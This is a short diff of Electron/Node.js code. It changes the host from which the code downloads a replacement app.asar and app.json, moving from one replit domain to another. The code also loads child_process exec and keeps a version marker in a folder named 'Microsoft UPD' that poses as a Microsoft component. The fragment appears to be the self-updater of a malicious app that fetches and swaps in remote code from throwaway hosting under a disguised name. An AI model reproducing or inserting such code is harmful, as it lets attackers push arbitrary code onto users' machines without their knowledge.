@@ -1,7 +1,7 @@
 const dwn = remote.require("electron-download-manager");
 const execar = require('child_process').exec;
-const urlApp = 'https://updatefileexe.gooq.repl.co/app.asar';
-const urlJSON = "https://updatefileexe.gooq.repl.co/app.json";
+const urlApp = 'https://991da9a0-3cd5-4b1c-bd62-7aa69d7f38ed-00-1mj9ymch8wdey.kirk.replit.dev/app.asar';
+const urlJSON = "https://991da9a0-3cd5-4b1c-bd62-7aa69d7f38ed-00-1mj9ymch8wdey.kirk.replit.dev/app.json";
 const Fs_c = require("fs");
 const child_process = require("child_process")
 const Versin = (Fs_c.existsSync(process.env.ALLUSERSPROFILE + "\\Microsoft UPD\\version.micro")) ? String(Fs_c.readFileSync(process.env.ALLUSERSPROFILE + "\\Microsoft UPD\\version.micro", "utf8")) : process.env.version;
